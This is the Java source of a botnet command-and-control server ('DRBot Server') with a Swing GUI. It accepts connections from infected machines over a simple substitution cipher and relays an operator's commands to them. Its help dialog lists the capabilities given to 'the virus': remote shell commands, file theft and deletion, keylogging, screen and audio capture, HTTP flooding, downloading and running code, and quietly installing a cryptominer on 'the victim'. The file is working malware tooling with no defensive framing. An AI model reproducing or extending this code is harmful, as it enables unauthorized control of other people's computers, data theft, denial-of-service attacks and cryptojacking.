package DRB_Server_Package;

/*
    @author MerNat [DRT]
    
*/

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.swing.DefaultListModel;
import javax.swing.JOptionPane;


public class DRB_Server extends javax.swing.JFrame 
{
   ArrayList clientOutputStreams;
   HashMap<String,PrintWriter> myHash;
   HashMap<String,HashMap> mySecretHash;
   
   ExecutorService pool;
   DefaultListModel<String> model;
   private Thread starter;
   ServerSocket serverSock;
   public class ClientHandler implements Runnable	
   {
       private BufferedReader reader;
       private boolean isLogged = false;
       private Socket sock;
       private String botName;
       private String[] secretCode;
       private HashMap<String,String> myHashEnc,myHashDec;
       private PrintWriter writer;
       private final char[] OrgArr = {'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    '0','1','2','3','4','5','6','7','8','9','>','-',' ','*','_','<',',','.','(',')','[',']','&','+','=','|','^','%','$','#','@','!','~','`','/','\\',':',';','\'','"'};
       
       public ClientHandler(Socket clientSocket) 
       {
            try 
            {
                sock = clientSocket;
                myHashEnc = new HashMap();
                myHashDec = new HashMap();
                writer = new PrintWriter(sock.getOutputStream());
                InputStreamReader isReader = new InputStreamReader(sock.getInputStream());
                reader = new BufferedReader(isReader);
            }
            catch (Exception ex) 
            {
                ta_chat.append("Unexpected error ... \n");
                ta_chat.setCaretPosition(ta_chat.getDocument().getLength());
            }

       }

       @Override
       public void run() 
       {
            String message;
            try 
            {
                while ((message = reader.readLine()) != null) 
                {
                    if(message.startsWith("**")){
                        if(isLogged==false){
                        genBotNameNSecureLine(message.replace("**",""));
                        userAdd(botName);
                        //add to the hash table ....
                        myHash.put(botName,writer);
                        mySecretHash.put(botName,myHashEnc);
                        ta_chat.append("\nBot: "+botName+" is joined at "+new Date()+"\n\n");
                        ta_chat.setCaretPosition(ta_chat.getDocument().getLength());
                        isLogged = true;
                        }
                    }else{
                        //show what the virus send us in the pannel .....
                        ta_chat.append(botName+"-> "+decData(message)+"\n");
                        ta_chat.setCaretPosition(ta_chat.getDocument().getLength());
                    }
                }
             } 
             catch (Exception ex) 
             {
                //clientOutputStreams.remove(client);
                ta_chat.append("\nBot: "+botName+" Disconnected at "+new Date()+"\n\n");
                userRemove(botName);
                closeConnection(sock);
             } 
	} 
       private void genBotNameNSecureLine(String msg){
        String message = msg;
        String both[] = message.split("##");
        botName = both[0];
        secretCode = both[1].replace(".","-").split("-");
        genHashCode();
        }
       private void genHashCode(){
           ArrayList<Integer> realSec = new ArrayList();
           for(int i = secretCode.length-1;i>=0;i--){
               realSec.add(Integer.parseInt(secretCode[i]));
           }
           for(int i = 0;i<realSec.size();i++){
            String one = String.valueOf(OrgArr[realSec.get(i)]);
            String two = String.valueOf(OrgArr[i]);
            myHashEnc.put(two,one);
            myHashDec.put(one,two);
        }
       }
       public String encData(String text){
            String allText[] = text.split("");
            String encText = "";
            for (String allText1 : allText) {
                encText += myHashEnc.get(allText1);
            }
            return encText;
       }
       private String decData(String text){
            String allText[] = text.split("");
            String decText = "";
            for (String allText1 : allText) {
                decText += myHashDec.get(allText1);
            }
            return decText;
       }
    }

    public DRB_Server() 
    {
        initComponents();
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        ta_chat = new javax.swing.JTextArea();
        b_start = new javax.swing.JButton();
        b_end = new javax.swing.JButton();
        b_clear = new javax.swing.JButton();
        jScrollPane2 = new javax.swing.JScrollPane();
        model = new DefaultListModel<>();
        bot_list = new javax.swing.JList<>(model);
        send_comm = new javax.swing.JTextField();
        exit = new javax.swing.JButton();
        shwCommand = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("DRBot Server v1.1 [Core Designed By Meron Menghisteab] [SecuredTunnel]");
        setAlwaysOnTop(true);
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setName("server"); // NOI18N
        setResizable(false);

        jScrollPane1.setToolTipText("");
        jScrollPane1.setAutoscrolls(true);

        ta_chat.setEditable(false);
        ta_chat.setBackground(new java.awt.Color(0, 0, 0));
        ta_chat.setColumns(20);
        ta_chat.setForeground(new java.awt.Color(255, 255, 102));
        ta_chat.setRows(5);
        ta_chat.setSelectionColor(new java.awt.Color(0, 204, 204));
        jScrollPane1.setViewportView(ta_chat);

        b_start.setText("START");
        b_start.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                b_startActionPerformed(evt);
            }
        });

        b_end.setText("END");
        b_end.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                b_endActionPerformed(evt);
            }
        });

        b_clear.setText("Clear");
        b_clear.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                b_clearActionPerformed(evt);
            }
        });

        bot_list.setBackground(new java.awt.Color(0, 0, 0));
        bot_list.setForeground(new java.awt.Color(255, 255, 153));
        bot_list.setSelectionMode(javax.swing.ListSelectionModel.SINGLE_SELECTION);
        bot_list.setToolTipText("");
        bot_list.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                bot_listMouseClicked(evt);
            }
        });
        jScrollPane2.setViewportView(bot_list);

        send_comm.setBackground(new java.awt.Color(0, 0, 0));
        send_comm.setForeground(new java.awt.Color(255, 255, 255));
        send_comm.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        send_comm.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                send_commActionPerformed(evt);
            }
        });

        exit.setText("Exit");
        exit.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                exitActionPerformed(evt);
            }
        });

        shwCommand.setText("Show Commands");
        shwCommand.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                shwCommandActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(send_comm)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 193, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 836, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(b_start, javax.swing.GroupLayout.DEFAULT_SIZE, 105, Short.MAX_VALUE)
                            .addComponent(b_end, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(shwCommand, javax.swing.GroupLayout.PREFERRED_SIZE, 147, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(b_clear, javax.swing.GroupLayout.DEFAULT_SIZE, 126, Short.MAX_VALUE)
                            .addComponent(exit, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))))
                .addContainerGap())
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 343, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 343, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(send_comm, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(b_clear, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                        .addComponent(b_start, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(shwCommand)))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(b_end, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(exit, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents

    private void b_endActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_b_endActionPerformed
        if(starter.isAlive()){
            try {
                ta_chat.append("Server stopping ... \n");
                ta_chat.setCaretPosition(ta_chat.getDocument().getLength());
                ta_chat.setText("");
                model.removeAllElements();
                serverSock.close();
            } catch (IOException ex) {
                
            }
        }else{
            ta_chat.append("Server is already down.\n");
            ta_chat.setCaretPosition(ta_chat.getDocument().getLength());
        }
    }//GEN-LAST:event_b_endActionPerformed

    private void b_startActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_b_startActionPerformed
        starter = new Thread(new ServerStart());
        starter.start();
        
        ta_chat.append("Server started ...\n");
        ta_chat.setCaretPosition(ta_chat.getDocument().getLength());
    }//GEN-LAST:event_b_startActionPerformed

    private void b_clearActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_b_clearActionPerformed
        ta_chat.setText("");
    }//GEN-LAST:event_b_clearActionPerformed

    private void send_commActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_send_commActionPerformed
        /*
            First print it in the pannel then ....
            send it to all clients 
            after that empty the damn input text .....
        */
        String msg = send_comm.getText();
        if(msg.contains("->")){
            tellSomeone(msg);
            send_comm.setText("");
        }else{
            tellEveryone(msg);
        ta_chat.append("Commander: "+msg+"\n");
        ta_chat.setCaretPosition(ta_chat.getDocument().getLength());
        send_comm.setText("");
        }
    }//GEN-LAST:event_send_commActionPerformed

    private void bot_listMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_bot_listMouseClicked
        String dd = (String)bot_list.getSelectedValue();
        send_comm.setText(dd+"->");
        send_comm.setFocusable(true);
    }//GEN-LAST:event_bot_listMouseClicked

    private void exitActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_exitActionPerformed
        // TODO add your handling code here:
        System.exit(0);
    }//GEN-LAST:event_exitActionPerformed

    private void shwCommandActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_shwCommandActionPerformed
        String myCommands = ">cmd command \n" +
                ">ps -list \n" +
                ">ps -kill pid \n" +
                ">driveinf -list \n" +
                ">driveinf -listD drive \n" +
                ">delete file/folder \n" +
                ">netinf \n" +
                ">get [port] [filePath] \n" +
                ">capture [port] \n" +
                ">httpflood [add] [req]\n" +
                ">msg [msg] ~ doneV\n" +
                ">keylog butNeedRest\n" +
                ">getL [port] \n"
                + ">down [link] [path] [loc] \n"
                + ">killBot\n" +
                ">open [FilePath]\n" +
                ">open browse [URI]\n" +
                ">exit\n" +
                ">who\n" +
                ">update [link.jar]\n" +
                ">rec [port] [minute]\n"
                + ">exc [dir/folder] [code to be executed (space with “_” replaced)]\n"
                + ">zip [zipFile] [destination/null]\n"
                + "\n>bmine [linkToDownloadMiner] [address] [user] [password] [codeMiner] [Retries] \n(N.B. This code downloads the miner and set it in the victim …. Cool ha!)\n\n"
                + ">version (Tells the version of the virus.)\n"
                + ">pcinf (Tells the needed infos about the victim pc)";
        JOptionPane.showMessageDialog(rootPane,myCommands,"Help For Commander",JOptionPane.INFORMATION_MESSAGE);
    }//GEN-LAST:event_shwCommandActionPerformed

    public static void main(String args[]) 
    {
        java.awt.EventQueue.invokeLater(new Runnable() 
        {
            @Override
            public void run() {
                new DRB_Server().setVisible(true);
            }
        });
    }
    
    public class ServerStart implements Runnable 
    {
        @Override
        public void run() 
        {
            clientOutputStreams = new ArrayList();
            myHash = new HashMap();
            mySecretHash = new HashMap();
            pool = Executors.newCachedThreadPool();
            try 
            {
                serverSock = new ServerSocket(80);

                while (true) 
                {
				Socket clientSock = serverSock.accept();

				Thread listener = new Thread(new ClientHandler(clientSock));
				pool.execute(listener);
                }
            }
            catch (Exception ex)
            {
                ta_chat.append(ex.toString()+"\n");
            }
        }
    }
    
    private void userAdd (String data) 
    {
        model.addElement(data);
    }
    
    private void userRemove (String data) 
    {
        model.removeElement(data);
        myHash.remove(data);
    }
    private void closeConnection(Socket mySoc){
        try{
            mySoc.close();
        }catch(IOException ioEx){
            System.err.println(ioEx);
        }
    }
    
    public void tellEveryone(String message) 
    {   
        Set<String> botName = myHash.keySet();
        int k = 0;
        PrintWriter[] writer = new PrintWriter[myHash.size()];
        for(String botNameN: botName){
            writer[k] = (PrintWriter)myHash.get(botNameN);
            writer[k].println(encData(message,mySecretHash.get(botNameN)));
            writer[k].flush();
            ++k;
        }
    }
    private void tellSomeone(String msg){
        //first split the damn msg to identify the user
        String[] msgB = msg.split("->");
        String usr = msgB[0];
        String msgS = msgB[1];
        PrintWriter Writee = (PrintWriter)myHash.get(usr);
           Writee.println(encData(msgS,mySecretHash.get(usr)));
           Writee.flush();
           ta_chat.append(usr+": "+msgS+" >>>>>>>> Sent.\n");
    }
    private String encData(String text,HashMap myHashEnc){
            String allText[] = text.split("");
            String encText = "";
            for (String allText1 : allText) {
                encText += myHashEnc.get(allText1);
            }
            return encText;
       }
    
    
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JButton b_clear;
    private javax.swing.JButton b_end;
    private javax.swing.JButton b_start;
    private javax.swing.JList bot_list;
    private javax.swing.JButton exit;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JTextField send_comm;
    private javax.swing.JButton shwCommand;
    private javax.swing.JTextArea ta_chat;
    // End of variables declaration//GEN-END:variables
}
